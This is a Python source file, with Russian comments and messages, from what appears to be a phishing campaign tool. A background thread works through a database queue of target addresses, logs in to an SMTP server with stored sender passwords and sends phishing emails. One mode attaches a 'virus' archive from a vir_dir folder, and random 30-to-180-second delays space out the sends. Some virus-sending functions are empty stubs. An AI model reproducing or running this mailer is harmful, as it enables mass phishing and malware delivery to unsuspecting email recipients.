import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from time import sleep
import random
import os

from manager.models.Stack import Stack
from core import daemon
from threading import Thread

"""Запускает процесс атаки в thread
"""


class Attacking(Thread):

    def __init__(self):
        Thread.__init__(self)

    def run(self):
        make_an_attack()


def make_an_attack():
    daemon.set_config('attacking', '1')
    host = daemon.get_config('host')
    port = daemon.get_config('port')
    try:
        while True:
            stack = Stack.objects.all().filter(status='0')
            stack_count = stack.count()
            if stack_count == 0:
                daemon.set_config('attacking', '0')
                return
            for email in stack:
                result = ''
                if email.method == '1':
                    result = send_fishing(host, port, email.sender, email.sender_password, email.email, email.subject,
                                          email.body)
                if email.method == '2':
                    the_file = os.getcwd() + '/vir_dir/init.zip'
                    # TODO: Генерация вируса и добавление пути
                    result = send_fishing(host, port, email.sender, email.sender_password, email.email, email.subject,
                                          email.body, the_file)
                if email.method == '3':
                    send_fishing_with_virus()
                stack_count -= 1
                daemon.logging('make_an_attack', result)
                if result[0] == 'У':
                    email.status = '1'
                else:
                    email.status = '4'
                email.save()
                sleep(random.randint(30, 180))
    except Exception as e:
        daemon.logging('make_an_attack', str(e))
    finally:
        daemon.set_config('attacking', '0')


def send_vir():
    pass


def send_fishing(host, port, sender, sender_password, email, subject, body, file=None):
    if file is not None:
        atk_type = 'вируса'
    else:
        atk_type = 'фишинга'
    try:
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'html'))
    except Exception as e:
        return 'err. Ошибка создания MIMEMultipart при отправке {0} msg: {1}'.format(atk_type, str(e))
    if file is not None:
        file_payload = MIMEBase('application', 'octet-stream')
        with open(file, 'rb') as fl:
            file_payload.set_payload(fl.read())
        fl.close()
        encoders.encode_base64(file_payload)
        file_payload.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(file)))
        msg.attach(file_payload)
    try:
        session = smtplib.SMTP(host, port)
    except Exception as e:
        return 'err. Ошибка подключения к хосту {0} по порту {1} при отправке {2}. Ошибка: {3}'.format(host, port,
                                                                                                       atk_type, str(e))
    session.starttls()
    try:
        session.login(sender, sender_password)
    except Exception as e:
        return 'err. Ошибка аутентификации для {0} с паролем {1} при отправке {2}. Ошибка: {3}'\
            .format(sender, sender_password, atk_type, str(e))
    try:
        session.sendmail(sender, email, msg.as_string().encode('utf-8'))
    except Exception as e:
        return 'err. Ошибка при отправке {0} на почту {1}: {2}'.format(atk_type, email, str(e))
    session.quit()
    return 'Успешная отправка {0}: {1}'.format(atk_type, email)


def send_fishing_with_virus():
    pass
